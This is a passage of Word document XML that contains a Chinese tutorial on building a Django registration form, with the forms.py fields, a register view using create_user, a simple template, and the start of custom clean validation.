        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    email = forms.EmailField(label='Email',)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DEFE43C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    password1 = forms.CharField(label='Password', widget=forms.PasswordInput)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19F37850" w14:textId="3436AA51" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    password2 = forms.CharField(label='Password Confirmation', widget=forms.PasswordInput)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A0491A1" w14:textId="062D7BCF" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C537413" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当然你也可以不用新建forms.py而直接在html模板里写表单，但我并不建议这么做。用forms.py的好处显而易见: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5898EBA5" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>所有的表单在一个文件里，非常便于后期维护，比如增添或修订字段。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D9504C3" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>forms.py可通过clean方法自定义表单验证，非常便捷（见后文）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58E4954A" w14:textId="2C5B4CD0" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="544019D0" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们使用RegistrationForm的视图views.py是这样子的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="025D51DB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>from django.shortcuts import render, get_object_or_404</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DB73A4D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.auth.models import User</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="450BFFFE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from .forms import RegistrationForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E987C18" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.http import HttpResponseRedirect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75C294E8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A541D8A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def register(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="558278CC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    if request.method == 'POST':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A7F6BD6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2AD66280" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        form = RegistrationForm(request.POST)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B3570D3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        if form.is_valid():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13FE83FC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            username = form.cleaned_data['username']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="510BC8AE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            email = form.cleaned_data['email']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A82B9D4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            password = form.cleaned_data['password2']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23D5CCD2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            # 使用内置User自带create_user方法创建用户，不需要使用save()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37DA32D3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            user = User.objects.create_user(username=username, password=password, email=email)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5044B09F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            # 如果直接使用objects.create()方法后不需要使用save()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7633A0E8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            return HttpResponseRedirect("/accounts/login/")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BEFD52D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="04CD128D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17561242" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        form = RegistrationForm()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C8C236C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A2B29EA" w14:textId="5C073BC0" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return render(request, 'users/registration.html', {'form': form})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24F3B852" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>模板是registration.html这样子的。如果你需要通过表单上传图片或文件，一定不要忘了给form加enctype="multipart/form-data"属性。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CB17A0A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;form action=”.” method=”POST”&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4194D98E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{{ form.as_p }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34F2F21D" w14:textId="7FA394EA" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="673F1195" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="025923FF" w14:textId="29A82F98" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们来看下RegistrationForm是怎么工作的:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30C6AC5A" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当用户通过POST方法提交表单，我们将提交的数据与RegistrationForm结合，然后验证表单RegistrationForm的数据是否有效。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50CED3CF" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果表单数据有效，我们先用Django User模型自带的create_user方法创建user对象，再创建user_profile。用户通过一张表单提交数据，我们实际上分别存储在两张表里。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29A0983F" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果用户注册成功，我们通过HttpResponseRedirect方法转到登陆页面</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="681FB028" w14:textId="7FB6FA2B" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果用户没有提交表单或不是通过POST方法提交表单，我们转到注册页面，生成一张空的RegistrationForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22B5CB12" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>表单的验证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2744E688" w14:textId="110ECC0E" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>每个forms类可以通过clean方法自定义表单验证。如果你只想对某些字段进行验证，你可以通过clean_字段名方式自定义表单验证。如果用户提交的数据未通过验证，会返回ValidationError，并呈现给用户。如果用户提交的数据有效form.is_valid()，则会将数据存储在cleaned_data里。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="194CA4C2" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在上述用户注册的案例里，我们在RegistrationForm通过clean方法添加了用户名验证，邮箱格式验证和密码验证。代码如下。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78BF8661" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django import forms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A6C28A8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.auth.models import User</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63C45172" w14:textId="41C72CCF" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>import re</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FF59B03" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def email_check(email):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76486583" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    pattern = re.compile(r"\"?([-a-zA-Z0-9.`?{}]+@\w+\.\w+)\"?")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79C44DF5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
